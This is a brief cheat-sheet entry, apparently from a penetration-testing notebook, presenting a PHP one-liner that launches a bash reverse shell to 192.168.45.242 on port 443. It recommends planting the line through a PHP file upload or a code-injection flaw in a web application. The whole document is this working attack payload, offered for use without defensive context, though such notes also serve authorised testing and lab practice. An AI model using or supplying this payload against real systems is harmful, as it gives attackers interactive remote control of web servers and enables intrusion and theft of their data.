---
title: "Reverse Shell (PHP)"
---

# Reverse Shell (PHP)

PHP one-liner that executes a bash reverse shell. Useful when PHP file upload is possible or code injection exists in a web application.

```shell
<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.45.242/443 0>&1'"); ?>
```
